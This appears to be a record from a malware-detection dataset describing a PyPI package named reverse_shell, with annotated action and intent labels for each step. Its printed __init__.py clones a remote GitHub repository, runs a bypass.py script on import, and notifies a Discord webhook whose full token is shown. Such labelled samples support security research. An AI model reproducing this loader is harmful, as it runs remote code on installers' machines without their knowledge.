{
  "metadata": {
    "package_name": "reverse_shell-1",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/reverse_shell-1.2.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "code_snippets": [
        {
          "snippet": "import requests\nimport git\nimport subprocess\nimport os\n\ndef send_discord_info():\n    webhook_url = 'https://discord.com/api/webhooks/1087389369901522986/aXyWO4s0TJpjXYvcsAstmA-xit7LiYh_pKsrEEOx0akWxJcBMKocrXhp2WgIld4alxcd'\n    headers = {'Content-Type': 'application/json'}\n    data = {'content': f'Â¡Alguien ha instalado el paquete reverse_shell!'}\n    response = requests.post(webhook_url, headers=headers, json=data)\n\nrepo_url = 'https://github.com/NotInfected/updater.git'\nrepo_path = os.path.join('C:', 'Users', 'repo')\n\nif not os.path.isdir(repo_path):\n    git.Repo.clone_from(repo_url, repo_path)\n\nos.chdir(repo_path)\nsubprocess.run(['python', 'bypass.py'])\n\nif __name__ == '__main__':\n    send_discord_info()",
          "triple_sequences": [
            {
              "action_api": "requests.post()",
              "action_description": "Sends HTTP POST request to URL",
              "action_id": "open_url_post",
              "object": "https://discord.com/api/webhooks/1087389369901522986/aXyWO4s0TJpjXYvcsAstmA-xit7LiYh_pKsrEEOx0akWxJcBMKocrXhp2WgIld4alxcd",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Send data to server",
              "intention_id": "send_data_server"
            },
            {
              "action_api": "os.path.isdir()",
              "action_description": "Checks if specified path exists and is a directory",
              "action_id": "check_directory_exists",
              "object": "C:/Users/repo",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine presence of directory",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "git.Repo.clone_from()",
              "action_description": "Clones Git repository to local path",
              "action_id": "clone_git_repo",
              "object": "https://github.com/NotInfected/updater.git, C:/Users/repo",
              "object_description": "Repository reference",
              "object_id": "repository_reference",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "os.chdir()",
              "action_description": "Changes current working directory",
              "action_id": "change_working_dir",
              "object": "C:/Users/repo",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Change working directory",
              "intention_id": "change_working_directory"
            },
            {
              "action_api": "subprocess.run()",
              "action_description": "Spawns new process to execute command without shell access",
              "action_id": "spawn_process_no_shell",
              "object": "['python', 'bypass.py']",
              "object_description": "Python command",
              "object_id": "python_command",
              "intention_description": "Execute file",
              "intention_id": "execute_file"
            }
          ]
        }
      ]
    }
  ]
}